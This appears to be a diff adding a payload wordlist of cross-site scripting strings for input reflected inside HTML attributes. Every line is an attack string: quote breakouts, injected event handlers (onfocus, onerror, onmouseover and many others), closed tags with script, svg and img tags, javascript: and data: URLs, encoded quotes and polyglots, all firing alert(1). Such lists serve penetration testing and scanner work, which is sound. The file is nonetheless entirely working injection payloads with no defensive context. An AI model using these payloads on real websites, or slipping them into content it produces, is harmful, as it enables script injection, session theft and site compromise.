@@ -1,0 +1,200 @@
+# Attribute Context XSS Payloads
+# These payloads work when input is reflected inside HTML tag attributes
+
+# Breaking out of double quotes
+" autofocus onfocus=alert(1) x="
+" onmouseover=alert(1) x="
+" onclick=alert(1) x="
+" onerror=alert(1) x="
+" onload=alert(1) x="
+" onfocus=alert(1) autofocus x="
+
+# Breaking out of single quotes
+' autofocus onfocus=alert(1) x='
+' onmouseover=alert(1) x='
+' onclick=alert(1) x='
+' onerror=alert(1) x='
+' onload=alert(1) x='
+' onfocus=alert(1) autofocus x='
+
+# No quotes (when attribute value is not quoted)
+autofocus onfocus=alert(1) x=
+onmouseover=alert(1) x=
+onclick=alert(1) x=
+
+# Closing the tag and opening new one
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# Just closing the tag
+"><img src=x onerror=alert(1)//
+'><img src=x onerror=alert(1)//
+
+# Event handler injection (double quote context)
+" onfocus="alert(1)
+" onclick="alert(1)
+" onmouseover="alert(1)
+" onerror="alert(1)
+" onload="alert(1)
+" onmouseenter="alert(1)
+" onmouseleave="alert(1)
+
+# Event handler injection (single quote context)
+' onfocus='alert(1)
+' onclick='alert(1)
+' onmouseover='alert(1)
+' onerror='alert(1)
+' onload='alert(1)
+' onmouseenter='alert(1)
+' onmouseleave='alert(1)
+
+# With autofocus to trigger immediately
+" autofocus onfocus="alert(1)
+' autofocus onfocus='alert(1)
+" onfocus=alert(1) autofocus x="
+' onfocus=alert(1) autofocus x='
+
+# Using different quote types
+" onclick=`alert(1)` x="
+' onclick=`alert(1)` x='
+
+# Backtick-based (when attr uses backticks)
+` onclick=alert(1) x=`
+` onmouseover=alert(1) x=`
+
+# Space variations
+" onfocus = alert(1) x="
+" onfocus=alert(1) x="
+"onfocus=alert(1) x="
+
+# Tab and newline
+" onfocus=alert(1)	x="
+" onfocus=alert(1)
+x="
+
+# Multiple event handlers
+" onfocus=alert(1) onclick=alert(2) x="
+' onmouseover=alert(1) onmouseout=alert(2) x='
+
+# With JavaScript protocol
+" href="javascript:alert(1)
+' href='javascript:alert(1)
+" src="javascript:alert(1)
+' src='javascript:alert(1)
+
+# Data protocol
+" src="data:text/html,<script>alert(1)</script>
+' src='data:text/html,<script>alert(1)</script>
+
+# Breaking attribute with special chars
+" accesskey="x" onclick="alert(1)
+' accesskey='x' onclick='alert(1)
+
+# Using HTML5 events
+" onanimationstart="alert(1)
+" onanimationend="alert(1)
+" ontransitionend="alert(1)
+" onwheel="alert(1)
+" ondrag="alert(1)
+" ondrop="alert(1)
+
+# Pointerevents
+" onpointerover="alert(1)
+" onpointerdown="alert(1)
+" onpointerup="alert(1)
+
+# Touch events
+" ontouchstart="alert(1)
+" ontouchend="alert(1)
+" ontouchmove="alert(1)
+
+# Form events
+" oninput="alert(1)
+" onchange="alert(1)
+" onsubmit="alert(1)
+" onreset="alert(1)
+
+# Media events
+" onplay="alert(1)
+" onpause="alert(1)
+" onended="alert(1)
+" onvolumechange="alert(1)
+
+# Window events
+" onresize="alert(1)
+" onscroll="alert(1)
+" onhashchange="alert(1)
+" onpageshow="alert(1)
+
+# Other useful events
+" oncopy="alert(1)
+" oncut="alert(1)
+" onpaste="alert(1)
+" onsearch="alert(1)
+
+# Breaking out with encoded quotes
+&#34; onclick=alert(1) x=&#34;
+&#39; onclick=alert(1) x=&#39;
+&quot; onclick=alert(1) x=&quot;
+
+# SVG context breaking
+" onload="alert(1)" xmlns="http://www.w3.org/2000/svg
+' onload='alert(1)' xmlns='http://www.w3.org/2000/svg
+
+# With style attribute
+" style="background:url('javascript:alert(1)')
+' style='background:url("javascript:alert(1)")
+
+# With onbegin for SVG
+" onbegin="alert(1)
+' onbegin='alert(1)
+
+# Less common events
+" onshow="alert(1)
+" ontoggle="alert(1)
+" oninvalid="alert(1)
+" onwaiting="alert(1)
+
+# Using contenteditable
+" contenteditable="true" onblur="alert(1)
+' contenteditable='true' onfocus='alert(1) autofocus
+
+# Drag and drop
+" draggable="true" ondragstart="alert(1)
+' draggable='true' ondragend='alert(1)
+
+# Tab index
+" tabindex="1" onfocus="alert(1)
+' tabindex='1' onfocus='alert(1)
+
+# Spellcheck
+" spellcheck="true" oninput="alert(1)
+' spellcheck='true' oninput='alert(1)
+
+# Breaking with null byte (some contexts)
+" onclick="alert(1)%00
+' onclick='alert(1)%00
+
+# Unicode bypass attempts
+" onclick="alert\u0028\u0031\u0029
+' onclick='alert\u0028\u0031\u0029
+
+# Using accesskey to make it user-triggerable
+" accesskey="x" onclick="alert(1)
+' accesskey='x' onclick='alert(1)
+
+# Polyglot-style attribute breaks
+"'><script>alert(1)</script>
+'"<script>alert(1)</script>
+"'><img src=x onerror=alert(1)>
+'"<img src=x onerror=alert(1)>
+
+# Minimal payloads
+" onfocus=alert(1)//
+' onfocus=alert(1)//
+"onclick=alert(1)//
+'onclick=alert(1)//
